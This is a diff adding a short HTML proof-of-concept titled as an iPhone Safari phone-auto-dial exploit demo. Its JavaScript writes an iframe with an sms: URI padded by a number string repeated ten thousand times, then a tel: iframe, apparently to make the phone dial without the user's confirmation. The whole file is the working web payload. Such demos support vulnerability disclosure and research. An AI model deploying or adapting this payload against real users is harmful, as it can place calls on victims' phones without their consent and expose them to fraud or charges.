@@ -1,0 +1,15 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;iPhone Safari phone-auto-dial Exploit Demo by Collin Mulliner&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script lang=javascript&gt;
+l = &quot;&lt;iframe src=\&quot;sms:&quot;;
+for (i = 0; i &lt; 10000; i++) {
+        l = l + &quot;3340948034298232&quot;;
+}
+l = l + &quot;\&quot; width=10 height=10&gt;&lt;/iframe&gt;&lt;iframe src=\&quot;tel:+12345\&quot; height=10 width=10&gt;&lt;/iframe&gt;&quot;;
+document.write(l);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
